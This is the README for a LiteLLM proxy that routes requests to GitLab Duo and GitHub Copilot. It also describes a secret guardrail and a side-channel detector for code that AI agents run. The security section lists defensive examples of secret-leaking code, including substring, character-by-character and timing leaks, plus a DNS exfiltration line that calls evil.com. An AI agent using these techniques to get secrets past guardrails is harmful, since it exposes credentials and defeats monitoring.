# LLM Proxy

LiteLLM-based proxy that routes OpenAI-compatible requests to GitLab Duo and GitHub Copilot. Handles OIDC token refresh (GitLab) and OAuth device flow (GitHub) — no cron jobs, no restarts.

## How it works

```mermaid
flowchart LR
    subgraph Clients
        A[OpenAI SDK]
        B[OpenClaw]
        C[OpenCode]
    end

    subgraph LLM Proxy
        D["LiteLLM<br/>:4000"]
        E["Token Callback<br/>(async_pre_call_hook)"]
        F["Token Cache<br/>(in-memory)"]
    end

    subgraph Providers
        G["GitLab Duo API<br/>cloud.gitlab.com"]
        H["GitHub Copilot API<br/>api.githubcopilot.com"]
    end

    A & B & C -->|OpenAI-compatible| D
    D -->|every request| E
    E -->|check expiry| F
    F -->|fresh?| E
    E -->|expired?| G2["GitLab OIDC<br/>/api/v4/ai/..."]
    G2 -->|new token| F
    E -->|inject headers| D
    D -->|gitlab/* models| G
    D -->|copilot/* models| H
```

```mermaid
sequenceDiagram
    participant C as Client
    participant L as LiteLLM :4000
    participant CB as Token Callback
    participant Cache as Token Cache
    participant GL as GitLab OIDC

    C->>L: POST /v1/chat/completions
    L->>CB: async_pre_call_hook(data)

    alt Token cached & valid (>5 min to expiry)
        CB->>Cache: get headers
        Cache-->>CB: cached headers (<1ms)
    else Token expired or near-expiry
        CB->>GL: fetch OIDC token (~200ms)
        GL-->>CB: token + headers + expires_at
        CB->>Cache: update cache
    end

    CB-->>L: data with extra_headers injected
    L->>GL: API call with fresh OIDC headers

    alt Success
        GL-->>L: LLM response
        L-->>C: OpenAI-format response
    else 401 Auth Failure (reactive invalidation)
        GL-->>L: 401 Unauthorized
        L->>CB: async_log_failure_event(kwargs)
        CB->>Cache: invalidate (expires_at = 0)
        L-->>C: error response (caller retries)
        Note over C,Cache: Next request auto-heals:<br/>async_pre_call_hook sees expired token,<br/>fetches fresh one from GitLab OIDC
    end
```

The callback (`gitlab_token_callback.py`) uses LiteLLM's `CustomLogger.async_pre_call_hook` to:
- Cache OIDC tokens in memory
- Refresh 5 minutes before expiry (single-flight via `asyncio.Lock`)
- Fall back to last-known-good token if refresh fails
- Reactively invalidate the cached token on 401 auth failures (`async_log_failure_event` sets expiry to 0, so the next request's `async_pre_call_hook` fetches a fresh token automatically). The failed request itself is not retried — callers retry at their level.

Zero restarts. Zero cron jobs. Token stays fresh automatically, and recovers after auth failures.

## Why not call GitLab Duo directly?

GitLab Duo requires OIDC tokens that expire every ~60 minutes. Without this proxy, every client would need to:

1. **Handle OIDC auth** — fetch tokens from `/api/v4/ai/third_party_agents/direct_access`, track expiry, refresh before timeout
2. **Inject GitLab-specific headers** — 12+ custom `x-gitlab-*` headers on every request
3. **Manage credentials** — each client needs the GitLab PAT

With the proxy, clients just use the standard OpenAI SDK with a single API key. The proxy handles all the GitLab auth complexity.

| | Direct to GitLab Duo | Via LLM Proxy |
|---|---|---|
| Client auth | OIDC token + 12 headers | Single API key |
| Token refresh | Every client implements it | Handled once, centrally |
| SDK compatibility | Custom HTTP client needed | Any OpenAI SDK works |
| Multi-provider | Hardcoded to GitLab | Swap providers in config |
| Observability | Per-client logging | Centralized token/usage logging |

## Setup

### Prerequisites

- Python 3.10+
- PostgreSQL 14+ (for admin dashboard)
- [LiteLLM](https://github.com/BerriAI/litellm): `pip install litellm`
- [PM2](https://pm2.keymetrics.io/): `npm install -g pm2`

### 1. Clone and configure

```bash
git clone git@github.com:nano-step/llm-proxy.git
cd llm-proxy

cp .env.example .env
# Edit .env with your values:
#   GITLAB_PAT=glpat-your-token-here
#   LITELLM_MASTER_KEY=your-api-key
#   LITELLM_PORT=4000
#   DATABASE_URL=postgresql://user:pass@host:5432/litellm
#   UI_USERNAME=admin
#   UI_PASSWORD=your-password
#   STORE_MODEL_IN_DB=True
```

### 2. Configure models

Edit `litellm_config.yaml` to add/remove models.

**GitLab Duo models** need:
- `model_name`: what clients use (e.g., `gitlab/claude-sonnet-4-6`)
- `model`: upstream provider model ID
- `api_base`: provider endpoint
- `api_key`: set to `gitlab-oidc` (actual auth handled by callback)

**GitHub Copilot models** need:
- `model_name`: what clients use (e.g., `copilot/gpt-4.1`)
- `model`: `github_copilot/<model-id>` (LiteLLM handles auth automatically)
- No `api_base` or `api_key` needed — resolved via OAuth device flow

### 3. Start

```bash
pm2 start ecosystem.config.cjs
pm2 save
```

### 4. Test

```bash
curl http://localhost:4000/v1/chat/completions \
  -H "Authorization: Bearer $LITELLM_MASTER_KEY" \
  -H "Content-Type: application/json" \
  -d '{"model": "gitlab/claude-haiku-4-5", "messages": [{"role": "user", "content": "Hello"}]}'
```

## Admin Dashboard

Access the built-in LiteLLM Admin UI at:

```
https://litellm.thnkandgrow.com/ui/
```

Login with:
- **Username:** `admin`
- **Password:** set via `UI_PASSWORD` env var

The dashboard provides spend tracking, virtual key management, model management, and usage analytics.

## GitHub Copilot Authentication

GitHub Copilot models (`copilot/*`, `copilot-premium/*`, `copilot-responses/*`, `copilot-embedding/*`) use **OAuth 2.0 Device Flow** — no manual token generation required.

### Prerequisites

- GitHub account with an active Copilot subscription (Free, Pro, Pro+, Business, or Enterprise)
- Browser access for one-time device flow authentication

### First-time setup

1. Start the proxy normally (`pm2 start ecosystem.config.cjs`)

2. Send a request to any Copilot model:

```bash
curl http://localhost:4000/v1/chat/completions \
  -H "Authorization: Bearer $LITELLM_MASTER_KEY" \
  -H "Content-Type: application/json" \
  -d '{"model": "copilot/gpt-4.1", "messages": [{"role": "user", "content": "Hello"}]}'
```

3. LiteLLM prints a device code to the console:

```
Please visit https://github.com/login/device and enter code XXXX-XXXX to authenticate.
```

4. Open `https://github.com/login/device` in a browser, enter the code, and authorize

5. Authentication completes automatically — tokens are stored at `~/.config/litellm/github_copilot/`

### How auth works under the hood

```mermaid
sequenceDiagram
    participant P as LiteLLM Proxy
    participant GH as GitHub OAuth
    participant U as User Browser
    participant API as Copilot API

    Note over P: First request to copilot/* model
    P->>GH: POST /login/device/code (scope: read:user)
    GH-->>P: device_code + user_code
    P->>P: Print "Visit github.com/login/device, enter XXXX-XXXX"
    U->>GH: Enter code + authorize
    P->>GH: Poll /login/oauth/access_token (every 5s, max 1 min)
    GH-->>P: access_token (gho_...)
    P->>API: POST /copilot_internal/v2/token
    API-->>P: Copilot API key + endpoint + expiry
    P->>P: Store tokens to ~/.config/litellm/github_copilot/
    Note over P: Subsequent requests use cached tokens
    Note over P: API key auto-refreshes on expiry
```

### Token storage

```
~/.config/litellm/github_copilot/
├── access-token     # OAuth access token (gho_...), long-lived
└── api-key.json     # Copilot API key + endpoint, auto-refreshed
```

### Copilot tiers and premium requests

| Tier | Cost | Premium Requests/Month | API Endpoint |
|---|---|---|---|
| Free | $0 | 50 | `api.githubcopilot.com` |
| Pro | $10/mo | 300 | `api.githubcopilot.com` |
| Pro+ | $39/mo | 1,500 | `api.githubcopilot.com` |
| Business | $19/user/mo | 300 | `api.business.githubcopilot.com` |
| Enterprise | $39/user/mo | 1,000 | `api.enterprise.githubcopilot.com` |

LiteLLM auto-detects the correct API endpoint from your subscription tier.

Models under `copilot-premium/*` (Claude, Gemini, etc.) consume premium requests. Standard `copilot/*` models (GPT-4o, GPT-3.5-turbo) are unlimited.

### CI/CD and headless environments

The device flow requires a browser, so for non-interactive environments, pre-authenticate on a local machine and copy the tokens:

```bash
# On a machine with a browser:
# 1. Trigger auth by making a request (see First-time setup above)
# 2. Copy tokens to the server:
scp -r ~/.config/litellm/github_copilot/ user@server:~/.config/litellm/github_copilot/
```

### Troubleshooting

| Problem | Fix |
|---|---|
| "No API key file found" | Make a request to trigger device flow, complete browser auth |
| "API key expired" | Auto-refreshes. If stuck: delete `~/.config/litellm/github_copilot/api-key.json`, retry |
| "Bad credentials" (401) | Delete `~/.config/litellm/github_copilot/access-token`, re-authenticate |
| Wrong API endpoint | Delete `api-key.json` — re-fetches correct endpoint for your tier |

### Optional environment variables

| Variable | Default | Description |
|---|---|---|
| `GITHUB_COPILOT_TOKEN_DIR` | `~/.config/litellm/github_copilot` | Token storage directory |
| `GITHUB_COPILOT_ACCESS_TOKEN_FILE` | `access-token` | Access token filename |
| `GITHUB_COPILOT_API_KEY_FILE` | `api-key.json` | API key JSON filename |

## Files

| File | Purpose |
|---|---|
| `gitlab_token_callback.py` | OIDC token manager + LiteLLM callback (proactive refresh + reactive 401 invalidation) |
| `litellm_config.yaml` | Model definitions + callback registration + DB config |
| `ecosystem.config.cjs` | PM2 process config (reads `.env`) |
| `.env` | Secrets (gitignored) — GITLAB_PAT, DATABASE_URL, UI_USERNAME, UI_PASSWORD, etc. |
| `proxy.py` | Legacy wrapper (`write_config()` preserves callbacks section) |
| `secret_guardrail.py` | Output-level secret detection: regex patterns, vault matching, entropy analysis, prompt injection blocking |
| `side_channel_detector.py` | Pre-execution AST taint analysis: detects indirect secret leakage via side-channels (5 languages) |
| `test_secret_guardrail.py` | Tests for secret guardrail |
| `test_side_channel_detector.py` | Tests for side-channel detector (80 tests) |

## Environment variables

| Variable | Required | Description |
|---|---|---|
| `GITLAB_PAT` | Yes | GitLab Personal Access Token with Duo access |
| `LITELLM_MASTER_KEY` | Yes | API key clients use to authenticate to the proxy |
| `LITELLM_PORT` | No | Proxy port (default: 4000) |
| `GITLAB_INSTANCE` | No | GitLab instance URL (default: https://gitlab.com) |
| `DATABASE_URL` | Yes (for dashboard) | PostgreSQL connection string |
| `UI_USERNAME` | No | Admin dashboard username (default: `admin`) |
| `UI_PASSWORD` | No | Admin dashboard password |
| `STORE_MODEL_IN_DB` | No | Store model configs in DB (default: `True`) |
| `GITHUB_COPILOT_TOKEN_DIR` | No | GitHub Copilot token storage path (default: `~/.config/litellm/github_copilot`) |

## Security: Secret Protection

Two-layer defense against secret leakage in AI agent interactions.

### Layer 1: Output Guardrail (`secret_guardrail.py`)

Scans prompts and responses for secrets using:
- **300+ regex patterns** for API keys, tokens, connection strings across all major providers
- **Vault matching** with k-gram partial match (catches obfuscated/split secrets)
- **Entropy-based detection** for high-entropy strings (base64, hex)
- **Normalization pipeline** that defeats zero-width character insertion, base64/hex encoding, URL encoding
- **Prompt injection blocking** for user messages attempting to extract secrets

Behavior: REDACT accidental secrets → allow request. BLOCK extraction attempts → reject.

### Layer 2: Side-Channel Detector (`side_channel_detector.py`)

Pre-execution AST-based taint analysis that catches **indirect** secret leakage — the techniques that bypass output-level redaction:

```python
# These bypass Layer 1 (output looks innocent) but Layer 2 catches them:
print(len(secret))              # MEDIUM  - leaks length
print(secret.startswith("a"))   # HIGH    - enables binary search
print(ord(secret[0]))           # CRITICAL - leaks byte value
print(secret[:3])               # CRITICAL - leaks substring
for c in secret: print(c)      # CRITICAL - leaks entire value
```

#### How it works

```mermaid
flowchart LR
    A[Code to execute] --> B{AST Parse}
    B --> C[Identify Taint Sources]
    C --> D[Propagate Taint]
    D --> E[Check Sinks]
    E -->|CRITICAL/HIGH| F[BLOCK]
    E -->|MEDIUM/LOW| G[WARN]
    E -->|Clean| H[ALLOW]
```

1. **Taint Sources** — where secrets enter code:
   - `os.environ`, `os.getenv()`, `subprocess.run()`
   - DB queries: `cursor.fetchone()`, `.fetchall()`
   - Sensitive file reads: `/proc/PID/environ`, `.ssh/`, `.env`
   - Variable names matching secret patterns (`password`, `api_key`, `token`, etc.)

2. **Taint Propagation** — tracks through:
   - Assignment chains: `x = secret.split()[0]`
   - Attribute access: `result.stdout`
   - Method calls: `data.get("host")`
   - Loop iteration: `for line in result.stdout.split()`
   - List/dict/set comprehensions: `[c for c in secret]`

3. **Side-Channel Sinks** — operations that leak info:

| Severity | Operations |
|---|---|
| CRITICAL | `s[i]`, `s[:3]`, `ord(s)`, `repr(s)`, `for c in s`, comprehensions |
| HIGH | `s.startswith()`, `s.find()`, `s == x`, `s.encode()`, `base64.b64encode(s)`, f-strings |
| MEDIUM | `len(s)`, `s.count()`, `s.split()`, `hash(s)` |
| LOW | `type(s)` |

#### Languages supported

| Language | Detection Method |
|---|---|
| Python | Full AST taint tracking |
| Bash | Regex: `cut -c`, `${s:0:3}`, `${#s}`, `curl $s` |
| JavaScript | Regex: `.charCodeAt()`, `.charAt()`, `.substring()` |
| Ruby | Regex: `.each_byte`, `.each_char`, `.bytes[]` |
| Go | Regex: `utf8.DecodeRune`, `fmt.Println(s[0])` |

Also detects embedded Python in bash commands (`python3 -c "..."`) and scans the embedded code.

#### CLI usage

```bash
# Scan a code string
python side_channel_detector.py "print(len(os.environ['SECRET']))"

# Scan a file
python side_channel_detector.py suspicious_script.py
```

#### Programmatic usage

```python
from side_channel_detector import scan_code, SideChannelConfig, Severity

# With defaults (reads env vars)
result = scan_code(agent_code)
if result.blocked:
    raise SecurityError(f"Side-channel detected: {result.findings}")

# With custom config
config = SideChannelConfig(
    mode="warn",
    min_severity=Severity.HIGH,
    languages={"python", "bash"},
    extra_taint_sources={"MY_INTERNAL_SECRET"},
)
result = scan_code(agent_code, config=config)
```

### Environment variables (security)

| Variable | Default | Description |
|---|---|---|
| `SIDE_CHANNEL_DETECTION_ENABLED` | `true` | Master on/off switch |
| `SIDE_CHANNEL_MIN_SEVERITY` | `MEDIUM` | Minimum severity to report: `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, `INFO` |
| `SIDE_CHANNEL_MODE` | `block` | `block` = reject on HIGH+, `warn` = findings only, `log` = silent |
| `SIDE_CHANNEL_LANGUAGES` | all | Comma-separated: `python,bash,js,ruby,go` |
| `SIDE_CHANNEL_EXTRA_SOURCES` | _(empty)_ | Extra variable names to pre-taint: `MY_VAR,CUSTOM_SECRET` |

### What it cannot detect

The side-channel detector catches ~80% of patterns via static analysis. It cannot detect:

- **Dynamic code generation**: `exec("pr" + "int(s)")`
- **Timing side-channels**: `time.sleep(0.1 * ord(s[0]))`
- **Exit code encoding**: `sys.exit(ord(s[0]))`
- **Multi-turn accumulation**: one character leaked per LLM conversation turn
- **DNS/network exfiltration**: `socket.getaddrinfo(f"{s[0]}.evil.com")`

For these, you need runtime sandboxing (eBPF/seccomp) or network-level monitoring.
